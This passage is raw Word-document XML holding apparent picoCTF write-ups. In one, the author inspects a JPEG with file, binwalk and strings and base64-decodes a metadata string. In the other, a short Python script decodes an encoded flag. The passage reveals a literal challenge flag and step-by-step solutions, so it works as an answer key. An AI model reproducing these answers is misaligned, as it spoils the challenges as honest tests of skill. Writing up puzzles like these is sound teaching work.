    <w:p w14:paraId="03231632" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74173242" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>| 10 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38F013BA" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3199D0" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22E6B933" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Author: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>susie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="085B9E17" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DCC938D" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49E45955" w14:textId="73A63BE9" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Files can always be changed in a secret way. Can you find the flag? cat.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B554D90" w14:textId="228D57B8" w:rsidR="006348ED" w:rsidRDefault="006348ED" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="236AEF7C" w14:textId="30478B68" w:rsidR="006348ED" w:rsidRDefault="006348ED" w:rsidP="00C36E31">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Whenever I get an image file, I go and run </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Noto Serif CJK SC" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t> (to make sure it's an image), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Noto Serif CJK SC" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>binwalk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t> (to see if there are hidden files), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Noto Serif CJK SC" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>strings</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t> and usually I pair that with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Noto Serif CJK SC" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>grep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t> and lastly I check the image in a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Noto Serif CJK SC" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>hexeditor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>, just to check the header and such.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="419C6DA3"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file cat.jpg </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2926E48D"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cat.jpg: JPEG image data, JFIF standard 1.02, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 2560x1598, components 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="541AC2FF"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 xml:space="preserve">:~/Downloads# </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006348ED">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>binwalk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006348ED">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t xml:space="preserve"> cat.jpg </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B79F4F" w14:textId="77777777" w:rsidR="006348ED" w:rsidRPr="006348ED" w:rsidRDefault="006348ED" w:rsidP="006348ED">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C67580B"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DECIMAL       HEXADECIMAL     DESCRIPTION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A95644"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525F585A" w14:textId="77777777" w:rsidR="006348ED" w:rsidRPr="006348ED" w:rsidRDefault="006348ED" w:rsidP="006348ED">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006348ED">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>0             0x0             JPEG image data, JFIF standard 1.02</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECD52E2" w14:textId="77777777" w:rsidR="006348ED" w:rsidRPr="006348ED" w:rsidRDefault="006348ED" w:rsidP="006348ED">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15F167F2" w14:textId="77777777" w:rsidR="006348ED" w:rsidRP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 strings cat.jpg |grep '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006348ED">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006348ED">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43BBF2D1" w14:textId="692D5919" w:rsidR="006348ED" w:rsidRDefault="006348ED" w:rsidP="006348ED">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006348ED">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>root@kali</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006348ED">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>:~/Downloads#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C8101C9" w14:textId="300B8E27" w:rsidR="006348ED" w:rsidRDefault="006348ED" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B37CAB3" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70861BC6" w14:textId="40E9144A" w:rsidR="00C36E31" w:rsidRDefault="006348ED">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48BC3C24" wp14:editId="785C0213">
            <wp:extent cx="4945809" cy="3208298"/>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a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4945809" cy="3208298"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D383169" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54F0880C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15EE467B" w14:textId="77777777" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>root@kali</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>:~/Downloads# echo cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9 |base64 -d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AA02667" w14:textId="628BC0AF" w:rsidR="00590591" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{the_m3tadata_1s_modified}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266BE672" w14:textId="14747A55" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5385DD54" w14:textId="5188C02C" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="375EB2E7" w14:textId="77777777" w:rsidR="00740B7E" w:rsidRPr="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00740B7E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Transformation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47021997" w14:textId="77777777" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>| 20 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="369C8F3F" w14:textId="77777777" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F30321D" w14:textId="77777777" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66FF4E49" w14:textId="77777777" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Author: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>madStacks</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6B6B38DC" w14:textId="77777777" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B7130CF" w14:textId="77777777" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06413DF7" w14:textId="20F2F752" w:rsidR="00740B7E" w:rsidRDefault="00740B7E" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>I wonder what this really is... enc ''.join([chr((</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ord</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(flag[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">]) &lt;&lt; 8) + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ord</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(flag[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> + 1])) for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> in range(0, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(flag), 2)])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2406C215" w14:textId="3250696F" w:rsidR="00313A37" w:rsidRDefault="00313A37" w:rsidP="00740B7E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05B29D04"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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>encoded_string</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>灩捯䍔䙻</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Malgun Gothic" w:eastAsia="Malgun Gothic" w:hAnsi="Malgun Gothic" w:cs="Malgun Gothic"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>ㄶ形</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>楴獟楮獴</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>㌴摟潦弸弰</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>㑣</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>〷㘰摽</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="303E4FDC"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C586C0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </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C586C0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>in</w:t>
      </w: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4EC9B0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>range</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len</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
    <w:p w14:paraId="618A879B" w14:textId="77777777" w:rsidR="00313A37" w:rsidRPr="00313A37" w:rsidRDefault="00313A37" w:rsidP="00313A37">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w: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DCDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>ord</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encoded_string</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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A81399A" w14:textId="236703CA" w:rsidR="00313A37" w:rsidRDefault="00313A37" w:rsidP="00886D6D">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:ind w:firstLine="528"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="DCDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>print</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chr</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DCDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>ord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encoded_string</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i</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>])&gt;&gt;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)&lt;&lt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="B5CEA8"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>8</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9CDCFE"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>end</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r w:rsidRPr="00313A37">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
